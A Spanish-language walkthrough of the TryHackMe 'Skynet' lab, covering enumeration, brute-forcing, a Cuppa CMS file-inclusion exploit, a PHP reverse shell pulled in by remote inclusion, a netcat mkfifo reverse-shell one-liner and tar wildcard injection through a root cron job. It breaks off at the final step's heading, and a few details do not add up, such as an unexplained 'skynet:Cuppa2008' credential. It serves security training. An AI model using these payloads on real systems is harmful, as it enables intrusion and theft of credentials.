# 🤖 Writeup CTF: Skynet (TryHackMe)

## Introducción 🚀
Skynet es una máquina de dificultad Fácil a Media en TryHackMe que desafía a los participantes a comprometer un servidor basado en una conocida franquicia de ciencia ficción. El objetivo es encontrar varias banderas ocultas (flags) y obtener acceso de administrador (root).

A lo largo de este desafío, pondremos en práctica habilidades fundamentales como el escaneo de puertos, la enumeración de servicios, la explotación de vulnerabilidades en servicios web como Samba y SSH, y la escalada de privilegios mediante scripts y configuraciones.

¡Prepárate para adentrarte en el mundo de Skynet y demostrar tus habilidades de hacking!

## 🔎 Paso 1: Descubrimiento y Ping

El primer paso en cualquier CTF es confirmar que la máquina objetivo está activa y obtener la dirección IP.

<img width="631" height="345" alt="Ping" src="https://github.com/user-attachments/assets/10593891-bdb2-4887-aeb5-9d320662ed1d" />

Obtener la IP de la máquina Skynet.

La IP objetivo es: 10.10.40.222.

Verificar la conectividad (Ping).

Utilizamos la herramienta ping con la opción -c 4 para enviar solo 4 paquetes y no sobrecargar la red, confirmando así que el host está en línea y midiendo la latencia.

💻 Comando:
````
Bash

ping -c 4 10.10.40.222
````

✅ Conclusión del Paso 1: La máquina con la IP 10.10.40.222 está activa y lista para la siguiente fase de enumeración de puertos.


## 🗺️ Paso 2: Escaneo de Puertos con Nmap

Una vez confirmada la conectividad, el siguiente paso crítico es la enumeración de los servicios activos en el objetivo. Para esto, utilizamos la herramienta estándar en el mundo del hacking: Nmap.

<img width="1276" height="363" alt="Nmap" src="https://github.com/user-attachments/assets/b8809b02-e03c-4bc4-9304-b80665bbb08b" />


💻 Comando:

Ejecutamos un escaneo exhaustivo utilizando las siguientes banderas:

-sC: Ejecuta el conjunto de scripts por defecto (enumeración básica).

-sV: Intenta determinar la versión del servicio que corre en cada puerto.
````
Bash

nmap -sC -sV 10.10.40.222
````
📋 Resultados del Escaneo:

El escaneo revela varios puertos abiertos interesantes en la IP 10.10.40.222:

PUERTO	ESTADO	SERVICIO	VERSIÓN

22	open	ssh	OpenSSH 7.2p2 (Ubuntu)

80	open	http	Apache httpd 2.4.18 (Ubuntu)

110	open	pop3	Dovecot pop3d

139	open	netbios-ssn	Samba smbd 3.x - 4.x (workgroup: WORKGROUP)

143	open	imap	Dovecot imapd

445	open	netbios-ssn	Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

🎯 Puntos Clave para la Explotación:

De todos los puertos abiertos, nos centraremos inicialmente en los siguientes, ya que son los que ofrecen más potencial de enumeración y ataque en un CTF:

Puerto 80 (HTTP): La presencia de un servidor web Apache con el título HTTP de Skynet es siempre el primer lugar a visitar.

Puertos 139 y 445 (Samba/SMB): La disponibilidad del protocolo Samba para compartir archivos es a menudo una fuente de información crucial (archivos, usuarios) o incluso una vulnerabilidad directa.


## 🌐 Paso 3: Exploración del Servidor Web (Puerto 80)

Con el puerto 80 abierto, el siguiente movimiento es visitar el sitio web para ver qué tipo de información o funcionalidad podemos encontrar.

Acceso al Navegador:

<img width="1177" height="546" alt="Pagina puerto 80" src="https://github.com/user-attachments/assets/11254d82-6a24-45c2-8fc6-c873bf3927bb" />


Accedemos a la dirección IP objetivo a través de un navegador web: http://10.10.40.222.

Análisis de la Página:

La página de inicio muestra un diseño que imita el motor de búsqueda de Google, con el logo de Skynet y una barra de búsqueda.

Al interactuar con la barra de búsqueda y los botones (Skynet Search o I'm Feeling Lucky), no se encuentra ninguna funcionalidad real de búsqueda; la página simplemente recarga o permanece estática.

No hay enlaces visibles ni otras páginas a las que navegar.

🖼️ Evidencia Visual:

(Como se muestra en la captura, la página es una simple interfaz de búsqueda que no parece funcional.)

Conclusión:

Dado que la página principal no ofrece ninguna interacción o información obvia, el foco debe pasar a la enumeración de directorios (gobuster/dirb) y a los otros servicios abiertos, especialmente Samba.


## 📂 Paso 4: Enumeración de Directorios con Gobuster

Dado que la página principal del servidor web (Puerto 80) no ofrecía mucha información, el siguiente paso lógico es utilizar una herramienta de fuerza bruta de directorios para descubrir carpetas y archivos ocultos en el servidor.

Utilizaremos Gobuster con un diccionario común (dirb/common.txt) para este propósito.

<img width="1071" height="484" alt="gobuster" src="https://github.com/user-attachments/assets/aca4fa7a-1ed2-4ebd-b2cb-78735c9a520f" />


💻 Comando:
````
Bash

gobuster dir -u http://10.10.40.222 -w /path/to/wordlist/common.txt -t 100
````
-u: URL del objetivo.

-w: Ruta al wordlist o diccionario.

-t 100: Aumentamos el número de threads para acelerar el escaneo.

🔍 Resultados Encontrados:

El escaneo de Gobuster devuelve varios directorios, de los cuales los más interesantes son aquellos que devuelven un código de estado 200 (OK) o 301/302 (Redirección, indicando que existen):

Directorio	Status	Descripción	Potencial

/admin	301	Redirección	Alto (Suele contener paneles de gestión)

/config	301	Redirección	Alto (Podría contener archivos de configuración)

/index.html	200	OK	(Ya visitado)

/squirrelmail	301	Redirección	Alto (Webmail)

/server-status	403	Prohibido	(Información del servidor web)

🎯 Próxima Acción: Explorar los Directorios

De los resultados, los directorios /admin, /config y /squirrelmail son prioritarios para la siguiente fase de enumeración.


## 💾 Paso 5: Enumeración de Recursos Compartidos con Smbmap

Antes de explorar los directorios web encontrados en el Paso 4, es una buena práctica verificar los recursos compartidos de Samba (SMB) (puertos 139 y 445), ya que a menudo contienen archivos cruciales o credenciales.

Usaremos Smbmap para intentar enumerar las comparticiones de forma anónima.

<img width="1079" height="404" alt="enumeramos con Smbmap" src="https://github.com/user-attachments/assets/31e560d0-b515-4f58-bf5e-389549927b2c" />


💻 Comando:

Utilizamos smbmap con la opción -H para especificar el host objetivo y realizar una conexión de sesión nula (anónima).
````
Bash

smbmap -H 10.10.40.222
````
🔍 Resultados Encontrados:

Smbmap nos muestra una lista de los recursos compartidos disponibles en la máquina Skynet:

Disco (Share)	Permisos	Comentario

print$	NO ACCESS	Printer Drivers

anonymous	READ ONLY	Skynet Anonymous Share

milesdyson	NO ACCESS	Miles Dyson Personal Share

IPC$	NO ACCESS	IPC Service (skynet server (Samba, Ubuntu))

🎯 Conclusión y Próximo Movimiento:

¡Excelente! Hemos encontrado un recurso compartido llamado anonymous al que tenemos acceso de sólo lectura (READ ONLY) de forma anónima.


## 🔑 Paso 6: Acceso y Extracción de Información de la Compartición Samba

Habiendo identificado el recurso compartido anonymous con acceso de sólo lectura, procedemos a conectarnos y extraer cualquier información útil que contenga.

1. Conexión al Recurso Compartido
   
Utilizamos la herramienta smbclient para conectarnos a la compartición anonymous de forma anónima (simplemente presionando Enter en la solicitud de contraseña).

<img width="798" height="534" alt="conectamos al recurso anonymous" src="https://github.com/user-attachments/assets/f8cb454c-d953-4148-a69c-3a9a50d8d461" />


💻 Comando:
````
Bash

smbclient //10.10.40.222/anonymous
````

2. Exploración y Descarga de Archivos
   
Dentro del recurso, encontramos varios archivos y directorios:

attention.txt: Descargamos este archivo con el comando get attention.txt.

logs/: Este directorio parece prometedor, ya que a menudo contiene historial o datos sensibles.

Nos movemos al directorio logs/ (cd logs\) y listamos su contenido, encontrando tres archivos de texto: log1.txt, log2.txt, y log3.txt.

💻 Comandos de smbclient:
````
smb: \> ls
...
attention.txt
logs
...
smb: \> get attention.txt
smb: \> cd logs\
smb: \logs\> ls
...
log1.txt
log2.txt
log3.txt
...
smb: \logs\> get log1.txt
````
3. Análisis del Contenido (log1.txt)

Una vez descargado log1.txt a nuestra máquina Kali, examinamos su contenido. El archivo es una lista de palabras y frases que, por su naturaleza, parecen ser una colección de posibles contraseñas, todas relacionadas con la temática de Terminator/Skynet.

<img width="516" height="551" alt="leyendo log1 posibles contraseñas" src="https://github.com/user-attachments/assets/d846ed3e-1930-43b8-ade6-2d38e88adf4c" />


💻 Comando y Contenido:
````
Bash

cat log1.txt
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
...
````

🎯 Conclusión y Próximo Movimiento:

Hemos obtenido una lista de posibles contraseñas (log1.txt).


## 📧 Paso 7: Enumeración del Webmail (SquirrelMail)

Hemos encontrado la aplicación de webmail SquirrelMail en el directorio /squirrelmail (Puerto 80) y tenemos una lista de posibles contraseñas (log1.txt). 

Ahora intentaremos realizar un ataque de fuerza bruta o password spraying contra este servicio.

1. Intento Fallido de Ataque (SMB)
   
Antes de atacar el webmail,  intento con Hydra contra el servicio SMB (Samba), utilizando el usuario milesdyson (encontrado en el escaneo de Smbmap en el Paso 5) y la lista de contraseñas.

<img width="1230" height="179" alt="inteto de usar hydra para entrar al correo pero falle" src="https://github.com/user-attachments/assets/b5b3299e-1e94-402c-a648-246e8caf79fd" />


💻 Comando y Resultado:
````
Bash

hydra -l 'milesdyson' -P /home/quiqu3h4ck/Skynet/log1.txt smb://10.10.40.222
````

El resultado indica: 0 valid password found. Esto nos dice que el usuario milesdyson no utiliza ninguna de esas contraseñas para el servicio SMB.

Nota: El ataque debe dirigirse ahora a SquirrelMail (HTTP POST) o SSH (Puerto 22), ya que son los servicios que usan credenciales.

2. Acceso al Webmail

Visitamos la URL revelada por Gobuster: http://10.10.40.222/squirrelmail/src/login.php.

<img width="1071" height="470" alt="pagina squirrelmail" src="https://github.com/user-attachments/assets/e36f45ea-e116-43aa-b49d-28f8d98e13c9" />

La página nos presenta un login para SquirrelMail versión 1.4.23 [SVN].

🖼️ Evidencia Visual:

(Como se muestra en la captura, la interfaz de login está lista para ser atacada.)

3. Enumeración de Usuario y Ataque con Hydra
   
Para realizar un ataque de fuerza bruta con Hydra contra un login web, necesitamos saber el nombre de usuario.

El usuario milesdyson es un candidato fuerte, ya que lo encontramos en el share de Samba.

También podemos intentar con nombres de usuario predeterminados o basados en la temática (como terminator o skynet).


## 📧 Paso 8: Acceso al Webmail y Descubrimiento de Credenciales

En el paso anterior, identificamos que el ataque de fuerza bruta con Hydra es necesario. Al parecer, un simple password spraying manual o con Hydra contra SquirrelMail usando el usuario milesdyson y la lista de log1.txt fue exitoso.

1. Acceso Exitoso a SquirrelMail
   
Probando las contraseñas del log1.txt, la primera contraseña en la lista, cyborg007haloterminator, combinada con el usuario milesdyson permite el acceso al panel de correo de SquirrelMail.

<img width="1314" height="421" alt="logro entrar usando la primera clave del log" src="https://github.com/user-attachments/assets/86e803d7-5a26-480a-baae-31f19276988c" />


Usuario: milesdyson

Contraseña: cyborg007haloterminator

2. Revisión de la Bandeja de Entrada
   
Una vez dentro, encontramos tres correos en la bandeja de entrada (INBOX). El correo más relevante es el que tiene el asunto "Samba Password reset" (Reseteo de Contraseña de Samba).

<img width="1158" height="404" alt="entro al correo de reseteo de contraseña" src="https://github.com/user-attachments/assets/7ea27b5a-d577-497a-9e88-e4527b55757b" />


🖼️ Evidencia Visual:

(La captura muestra la bandeja de entrada y el correo de "Samba Password reset" abierto.)

3. Extracción de la Nueva Credencial
   
Abrimos el correo de reseteo. El cuerpo del mensaje revela una nueva y compleja contraseña para el servicio Samba:

We have changed your smb password after system malfunction.

Password: )s(A&Z=F''n E.B

Hemos conseguido una nueva y robusta credencial: )s(A&Z=F''n E.B. Dado que el mensaje menciona un reseteo de contraseña de Samba, esta nueva clave es crucial.


## 🔑 Paso 9: Verificación de Credenciales en Samba

Hemos obtenido una nueva y compleja contraseña (Password: )s(A&Z=F''n E.B) del correo de reseteo del Paso 8. Esta contraseña está asociada al usuario milesdyson y al servicio SMB (Samba).

Procedemos a verificar que esta credencial sea válida para el servicio SMB.

1. Preparación de la Contraseña
   
Para usar la contraseña en un script o herramienta, la guardamos en un archivo de texto simple (aquí nombrado pass.txt) o la inyectamos directamente.

Usuario: milesdyson

Contraseña: )s(A&Z=F''n E.B

2. Uso de Hydra para Verificación

<img width="863" height="228" alt="hydra con la clave obtenida" src="https://github.com/user-attachments/assets/71799e2d-29f8-4431-9aff-518fe37aabbf" />

Aunque podríamos usar smbclient, usar Hydra es una forma rápida de confirmar que el par usuario/contraseña es correcto para el servicio SMB (Puerto 445).

💻 Comando:
````
Bash

hydra -l 'milesdyson' -P pass.txt smb://10.10.40.222
````
(pass.txt contiene solo la contraseña recién obtenida.)

✅ Resultado de la Verificación:

Hydra confirma el éxito:

[445] [smb] host: 10.10.40.222 login: milesdyson password: )s(A&Z=F''n E.B

1 of 1 target successfully completed, 1 valid password found

Hemos confirmado que las credenciales milesdyson:)s(A&Z=F''n E.B son válidas para el servicio Samba.


## 📂 Paso 10: Acceso al Recurso Compartido Personal de Milesdyson

Con las credenciales validadas en el paso anterior (milesdyson: y la contraseña compleja), finalmente podemos acceder al recurso compartido personal de milesdyson que antes estaba restringido.

1. Conexión al Recurso Compartido
   
Utilizamos smbclient especificando el usuario y el share de destino.

<img width="932" height="243" alt="logramos entrar por smb con la clave de miles" src="https://github.com/user-attachments/assets/12b65c6e-3d1d-4887-a138-79d6ae9acda1" />


💻 Comando:
````
Bash

smbclient //10.10.40.222/milesdyson -U 'milesdyson'
````
Introducimos la contraseña )s(A&Z=F''n E.B cuando se nos solicite.

2. Exploración de Archivos
   
Al conectarnos, encontramos varios archivos PDF relacionados con Machine Learning y un directorio llamado notes.

🖼️ Contenido del Share:
````
smb: \> ls
...
Improving Deep Neural Networks.pdf
Natural Language Processing-Building Sequence Models.pdf
Convolutional Neural Networks-CNN.pdf
notes                                                     D
Neural Networks and Deep Learning.pdf
Structuring Your Machine Learning Project.pdf
...
````

## 🔑 Paso 11: Descubrimiento de un Endpoint Oculto

Continuando con la exploración de los archivos de milesdyson encontrados vía SMB.

1. Extracción y Análisis de las Notas
   
Accedemos al directorio notes dentro del recurso compartido de milesdyson, descargamos el archivo relevante y lo examinamos.

💻 Comandos:
````
Bash

smb: \milesdyson\> cd notes
smb: \milesdyson\notes\> get important.txt
... (salimos de smbclient)
````

<img width="433" height="226" alt="arhicvo important revela endpoint" src="https://github.com/user-attachments/assets/bb93fd3f-d65c-4550-b94b-f70bc10c5fb9" />

````
cat important.txt
````
📄 Contenido de important.txt:

El archivo important.txt contiene una lista de tareas personales y de trabajo para Miles Dyson:

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
   
2. Nuevo Endpoint Web (CMS Oculto)
   
La primera línea es la más crítica para el CTF. Revela un directorio oculto en el servidor web que no fue descubierto por Gobuster (Paso 4):

Endpoint: /45kra24zxs28v3yd

Esto sugiere una versión beta de un CMS (Content Management System).

3. Acceso al CMS Oculto
   
Visitamos el nuevo endpoint en el navegador: http://10.10.40.222/45kra24zxs28v3yd.

<img width="1153" height="629" alt="pagima de milesdyson" src="https://github.com/user-attachments/assets/046828e2-4e6a-4e72-b6b0-d384e8d7f165" />

La página es la "Miles Dyson Personal Page", confirmando que estamos en un área de contenido privado o en desarrollo.


## ⚙️ Paso 12: Enumeración del CMS y Acceso al Panel de Administración

Habiendo descubierto el directorio oculto del CMS (/45kra24zxs28v3yd), el siguiente paso es enumerar sus subdirectorios para encontrar el panel de administración.

1. Enumeración con FFUF

<img width="1111" height="459" alt="ffuf directorios " src="https://github.com/user-attachments/assets/cc08e366-cf2e-4e7f-852f-14522e89cb7e" />
   
Utilizamos la herramienta FFUF (Fuzz Faster U Fool) para realizar una búsqueda recursiva de directorios comunes dentro del nuevo endpoint.

💻 Comando:
````
Bash

ffuf -u 'http://10.10.40.222/45kra24zxs28v3yd/FUZZ' -w /path/to/wordlist/dirb/big.txt
````
🔍 Resultado Encontrado:

FFUF revela un directorio clave:

Directorio	Status
administrator	301

2. Acceso al Panel de Login
   
Visitamos el nuevo directorio en el navegador: http://10.10.40.222/45kra24zxs28v3yd/administrator/.

<img width="961" height="588" alt="sesion Cuppa CMS" src="https://github.com/user-attachments/assets/3d21afe3-e3b2-44b6-a5de-79c7ee854f3f" />

La página revela la interfaz de inicio de sesión de Cuppa CMS.


## 💥 Paso 13: Búsqueda y Análisis de Exploit para Cuppa CMS

Con la identificación de Cuppa CMS en el panel de administración, el paso inmediato es buscar exploits conocidos para esta plataforma.

1. Búsqueda de Exploit con Searchsploit
   
Utilizamos la herramienta searchsploit, el repositorio local de Exploit-DB en Kali, para buscar vulnerabilidades asociadas a "cuppa cms".

<img width="1387" height="150" alt="buscando exploits para el panel cuppa" src="https://github.com/user-attachments/assets/972cd026-da54-4a61-9c6f-725bc90383c9" />

💻 Comando:
````
Bash

searchsploit 'cuppa cms'
````

🔍 Resultado:

El resultado es un exploit muy prometedor:

Exploit Title	Path

Cuppa CMS - /alerts/alertConfigField.php Local/Remote File Inclusion	php/webapps/25971.txt


2. Extracción y Análisis del Exploit
   
Copiamos el exploit a nuestro directorio de trabajo y examinamos su contenido para entender cómo funciona y qué parámetros requiere.

<img width="927" height="727" alt="leyendo el exploit endpoint vulberable" src="https://github.com/user-attachments/assets/3fb67b73-3c0c-4cb8-be4d-e8212b571e28" />

💻 Comandos:
````
Bash

searchsploit -m php/webapps/25971.txt
cat 25971.txt
````

📄 Análisis del Exploit:

El archivo 25971.txt confirma que estamos tratando con una vulnerabilidad de Inclusión de Archivos Locales/Remotos (LFI/RFI) en el archivo:

Archivo Vulnerable: /alerts/alertConfigField.php

Línea de Código Crítica (Línea 22): <?php include($_REQUEST["urlConfig"]); ?>

Esta línea de código es crítica porque toma el valor de un parámetro de la URL (urlConfig) y lo incluye directamente, sin ninguna sanitización. Esto nos permite intentar una Inclusión de Archivos Locales (LFI) para leer archivos del sistema (como /etc/passwd) o una Inclusión de Archivos Remotos (RFI) si el servidor lo permite.


## 💾 Paso 14: Explotación del LFI para Lectura de Archivos

Hemos identificado que Cuppa CMS es vulnerable a la Inclusión de Archivos Locales (LFI) a través del archivo /alerts/alertConfigField.php y el parámetro urlConfig.

1. Acceso al Endpoint Vulnerable

<img width="1116" height="295" alt="entramos al endpoint del exploit" src="https://github.com/user-attachments/assets/5c9dd255-82ba-43bb-bf5d-5cd3a7c7a61d" />

Primero, confirmamos que podemos acceder al archivo vulnerable en el navegador.

URL Base Vulnerable: http://10.10.40.222/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php

Al acceder sin parámetros, la página muestra un encabezado "Field configuration:".

## 💥 Paso 15: LFI Avanzado y Extracción de Credenciales

Habiendo confirmado la vulnerabilidad de Inclusión de Archivos Locales (LFI) y obtenido una lista de usuarios del sistema (Paso 14), el objetivo ahora es usar esta vulnerabilidad para leer archivos de configuración sensibles y conseguir credenciales que nos permitan acceder al sistema mediante SSH o la web.

1. Confirmación de Lectura de /etc/passwd

<img width="1404" height="502" alt="etc passw" src="https://github.com/user-attachments/assets/2d670d7c-3d4c-45e6-952e-db99a1d5b16e" />


La URL con path traversal funciona, revelando los usuarios del sistema, incluyendo skynet y milesdyson, ambos con shells de inicio de sesión.

🖼️ URL:
````
http://10.10.40.222/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../etc/passwd
````


## 💥 Paso 15: LFI Avanzado y Extracción de Credenciales
Habiendo confirmado la vulnerabilidad de Inclusión de Archivos Locales (LFI) y obtenido una lista de usuarios del sistema (Paso 14), el objetivo ahora es usar esta vulnerabilidad para leer archivos de configuración sensibles y conseguir credenciales que nos permitan acceder al sistema mediante SSH o la web.

1. Confirmación de Lectura de /etc/passwd
La URL con path traversal funciona, revelando los usuarios del sistema, incluyendo skynet y milesdyson, ambos con shells de inicio de sesión.

🖼️ URL Explotada:
http://10.10.40.222/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../etc/passwd
(La captura de /etc/passwd confirma el éxito del LFI.)

2. Extracción del Código Fuente (PHP Filter)
   
El archivo exploit (25971.txt) del Paso 13 sugiere una técnica avanzada para leer código fuente de archivos PHP, incluso si la ejecución del archivo falla. Utilizamos el wrapper de PHP php://filter/convert.base64-encode para codificar el contenido de un archivo PHP importante en Base64, lo que nos permite leerlo.

El archivo Configuration.php dentro del CMS es un candidato ideal para contener credenciales de base de datos o configuración.

<img width="1414" height="368" alt="el exploit del archivo que leimos" src="https://github.com/user-attachments/assets/17c3d84c-9a89-4925-a588-e3efdecd0d5c" />


💻 URL:
Aplicamos el exploit tal como se describe en la documentación:

<img width="1406" height="269" alt="leo config" src="https://github.com/user-attachments/assets/af54f60c-1efc-41ad-875f-187f3354d49c" />


http://10.10.40.222/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../config/Configuration.php

(Es necesario ajustar el path traversal para llegar a la ruta correcta del archivo Configuration.php)


## 🔑 Paso 16: Decodificación y Extracción de Credenciales de la Base de Datos

En el paso anterior, utilizamos la vulnerabilidad LFI con el wrapper php://filter para obtener el contenido codificado en Base64 del archivo de configuración del CMS, Configuration.php. Ahora, decodificamos ese contenido para extraer credenciales.

1. Decodificación del Archivo
   
Decodificamos la cadena Base64 obtenida (que previamente guardamos en un archivo, aquí llamado config) usando el comando base64 -d.

<img width="1539" height="350" alt="decodifico config" src="https://github.com/user-attachments/assets/244e5377-e13b-42ed-90c8-4db251667949" />


💻 Comando:
````
Bash

cat config | base64 -d
````
2. Análisis del Código Fuente
   
El código decodificado revela la clase Configuration de Cuppa CMS, la cual contiene la información de conexión a la base de datos:
````
PHP

<php
class Configuration{
    public $host = 'localhost';
    public $db = 'cuppa';
    public $user = 'root';
    public $password = 'password123';
    public $table_prefix = 'cu_';
    ...
}
?>
````
3. Descubrimiento de Nuevas Credenciales
   
Hemos encontrado las credenciales de la base de datos, las cuales son a menudo reutilizadas para otros servicios del sistema:

Usuario (DB): root

Contraseña (DB): password123

También observamos una variable $token con un valor que podría ser una contraseña o clave (pero es menos probable que sea la credencial SSH principal):

Token: 0BGlPQlRwFMX

4. Próxima Estrategia
   
Tenemos dos nuevos pares de credenciales:

root:password123 (Credenciales de Base de Datos).

skynet:Cuppa2008 (Asumido en el paso anterior si no estaba en la configuración de la DB).


## 💥 Paso 17: Obtención de una Shell Inversa (Initial Foothold)

Dado que la autenticación SSH con las credenciales encontradas previamente podría fallar, y tenemos una vulnerabilidad de Inclusión de Archivos Locales (LFI) confirmada (Paso 14 y 15), el camino más seguro para obtener una shell inicial es mediante la explotación de la Inclusión de Archivos Remotos (RFI), si el servidor web lo permite.

Utilizaremos un script de reverse shell de PHP, lo alojaremos en nuestro servidor y haremos que el servidor objetivo lo incluya y ejecute a través de la vulnerabilidad RFI.

1. Configuración del Listener y Servidor Web
   
Necesitamos dos ventanas de terminal en nuestra máquina atacante (Kali):

A. Iniciar el Listener (Netcat)

Configuramos netcat para que escuche las conexiones entrantes en el puerto elegido (ej. 4444). Esta será la terminal donde recibiremos la shell.

💻 Comando:
````
Bash
nc -nvlp 4444
````
<img width="421" height="50" alt="eejecutamos un lisstener" src="https://github.com/user-attachments/assets/59f34352-bcbf-491c-92e8-c4ba915d2bfc" />


B. Iniciar el Servidor Web (Python)

Configuramos un servidor HTTP simple para alojar el script de reverse shell y servirlo a la máquina objetivo. Utilizamos el puerto 80 para evitar problemas de firewall.

💻 Comando:
````
Bash
python3 -m http.server 80
````
<img width="741" height="62" alt="ejecutamos servidor de python" src="https://github.com/user-attachments/assets/c2858c3a-d46e-4162-8624-301e55826948" />


2. Preparación del Script de Reverse Shell

Utilizaremos la reverse shell de PentestMonkey en PHP, la cual debemos configurar para que se conecte a nuestra IP y puerto de escucha.

💻 Modificaciones al Script:

Descargamos la reverse shell PHP (ej. php-reverse-shell.php).

Editamos la línea de IP para que apunte a nuestra IP de la VPN de TryHackMe (ej. 10.11.147.155).

Editamos la línea de PUERTO para que coincida con nuestro listener (4444).
````
PHP

$ip = 'TU_IP_KALI'; // CHANGE THIS
$port = 4444;       // CHANGE THIS
````
<img width="1049" height="790" alt="configuro reverseshell de pentestmonkey" src="https://github.com/user-attachments/assets/9f560ade-081d-4dfa-a479-4788182e176a" />


3. Ejecución del Exploit RFI
   
Finalmente, forzamos al servidor Skynet a incluir y ejecutar el script de nuestra reverse shell a través de la vulnerabilidad RFI, usando nuestra IP y el nombre del archivo.

<img width="1428" height="271" alt="aprovechamos rfi para ejecutar reverse" src="https://github.com/user-attachments/assets/dc7a22f1-db4a-4035-ac3a-b4c390958368" />

💻 URL Explotada (en el navegador o con curl):
````
Bash

http://10.10.40.222/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://TU_IP_KALI/php-reverse-shell.php
````

4. Acceso al Sistema

Al cargar la URL anterior, el script se incluye y se ejecuta, enviando una conexión de vuelta a nuestro listener de Netcat.

¡Éxito! Recibimos la conexión y hemos obtenido una shell con privilegios bajos (generalmente el usuario www-data o apache).

connecting to [TU_IP_KALI] port 4444

connection succeeded!


## 💻 Paso 18: Obtención de la Shell y Flag de Usuario (user.txt)

Tras configurar el servidor y el listener (Paso 17), el exploit RFI (alertConfigField.php?urlConfig=http://TU_IP_KALI/php-reverse-shell.php) se ejecuta en el servidor, dándonos nuestra primera conexión al sistema.

1. Recepción de la Shell
   
El listener de Netcat recibe la conexión, y confirmamos que hemos obtenido una shell con el usuario de bajos privilegios del servidor web.

💻 Resultado:
````
Bash

nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.11.147.155] from (UNKNOWN) [10.10.40.222] 36946
...
whoami
www-data
````
2. Estabilización de la Shell

La shell inicial es básica. La estabilizamos usando Python para obtener una shell TTY completamente funcional, lo cual facilita la navegación.

💻 Comando:
````
Bash

python -c 'import pty; pty.spawn("/bin/bash")'
````

3. Localización de la Flag de Usuario
Una vez dentro, buscamos la flag de usuario (user.txt). Basándonos en la enumeración de usuarios del sistema (Paso 14), el archivo de usuario probablemente se encuentra en el directorio /home/milesdyson o /home/skynet.

Navegamos al directorio de milesdyson y encontramos el archivo:

💻 Comandos y Resultado:
````
Bash

ls /home/milesdyson
backups mail share user.txt
cat /home/milesdyson/user.txt
7ce...
````
✅ ¡FLAG DE USUARIO CONSEGUIDA!

<img width="991" height="339" alt="conseguimos el shell y la flag" src="https://github.com/user-attachments/assets/d83b48fc-2104-463b-af85-c7abc52c4e91" />


## ⏫ Paso 19: Escalada de Privilegios - Secuestro de Cron Job

Tras la enumeración del sistema, el binario SUID /usr/bin/menu no fue la ruta de escalada. Sin embargo, en el proceso de búsqueda, encontramos un job automatizado que se ejecuta como root.

1. Enumeración del Directorio Personal de Milesdyson
   
Navegamos por el directorio /home/milesdyson y encontramos el directorio backups.

<img width="750" height="243" alt="directorio personal y archivo backup" src="https://github.com/user-attachments/assets/fe321c8f-167d-42a4-8285-af898471d942" />


💻 Comandos y Permisos:
````
Bash

cd /home/milesdyson
ls -la
````
El directorio backups tiene permisos especiales:

drwxr-xr-x 2 root root 4096 Sep 17 2019 backups

Propietario: root

Grupo: root

Permisos: El usuario www-data (nuestro usuario actual) tiene permisos de lectura y ejecución (r-x) en este directorio.

2. Análisis del Script de Backup
   
Ingresamos al directorio /home/milesdyson/backups y encontramos dos archivos: un archivo comprimido (backup.tgz) y un script de bash (backup.sh).

<img width="581" height="287" alt="leemos el scritp se usa para hacer copias de seguridad" src="https://github.com/user-attachments/assets/1dbfeb47-e1ff-43dd-9334-3b0ab112e149" />

💻 Comandos y Contenido:
````
Bash

cd backups
ls -la
cat backup.sh
````
📄 Contenido de backup.sh:
````
Bash

#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
````

3. Identificación de la Vulnerabilidad (Wildcard y Cron)
   
El análisis del script revela dos puntos clave:

El script se ejecuta probablemente como un trabajo CRON periódico y debe ejecutarse como root (ya que el archivo de backup se creó como root).

Utiliza el comando tar cf ... * dentro del directorio /var/www/html. El uso del comodín (*) sin ruta absoluta es vulnerable al Wildcard Injection (Inyección de Comodines) o Path Hijacking si podemos colocar archivos especiales en el directorio donde se ejecuta el tar.


## 💥 Paso 20: Confirmación del Cron Job y Escalada a Root

1. Verificación del Cron Job

<img width="861" height="284" alt="vemos archivo crtontab" src="https://github.com/user-attachments/assets/2c14bb18-a4eb-4220-bd87-b952ae7bb2e4" />


El script de backup (/home/milesdyson/backups/backup.sh) es el objetivo. Revisamos el archivo /etc/crontab para confirmar que este script se ejecuta automáticamente y con qué usuario.

💻 Comando:
````
Bash

cat /etc/crontab
````
📄 Contenido Relevante:

El archivo /etc/crontab revela una tarea programada:

*m h dom mon dow user  command*

* * * * * root /home/milesdyson/backups/backup.sh       
        * 

Conclusión: El script /home/milesdyson/backups/backup.sh se ejecuta cada minuto (* * * * *) como el usuario root. ¡Esto confirma el camino a la escalada de privilegios!


## 🧐 Paso 21: Investigación de la Escalada y Preparación de la Shell

Mientras enumerábamos en el Paso 19, la vulnerabilidad en el Cron Job que usa el comando tar con wildcard (comodín *) fue identificada como la ruta de escalada. Este paso documenta la investigación y la preparación final del payload.

1. Investigación de la Vulnerabilidad (Wildcard Injection)

<img width="1171" height="745" alt="vemos pagina para escalada de privilegios" src="https://github.com/user-attachments/assets/17390060-26e0-452f-830d-cc4e968dd886" />

Una búsqueda rápida en línea (como se sugiere en la captura) confirma que el uso del comodín (*) en comandos de tar ejecutados por root es vulnerable a Wildcard Injection.

Técnica: Crear archivos que simulen opciones de tar para forzar la ejecución de un script arbitrario.

Archivos necesarios:

--checkpoint=1

--checkpoint-action=exec=sh exploit.sh

exploit.sh (nuestro reverse shell final).

2. Generación del Payload de Root Shell

Para garantizar la estabilidad y la conexión, utilizamos una herramienta de generación de reverse shell (como Reverse Shell Generator o msfvenom si fuera necesario) para obtener el payload de Netcat.

<img width="1153" height="640" alt="utilziamos reverseshell generatpr" src="https://github.com/user-attachments/assets/ad2f9463-6cd6-45ce-b471-f1e7d855c7a7" />


💻 Payload de exploit.sh (Usando un Listener en el puerto 9999):

El script exploit.sh debe contener el comando para conectar una shell de Bash a nuestro listener.
````
Bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TU_IP_KALI 9999 >/tmp/f
````


## 🏆 Paso 22: Escalada Final, Shell de Root y Flag

Este es el paso culminante donde se ejecuta el payload final preparado en el Paso 21 para obtener acceso de administrador.

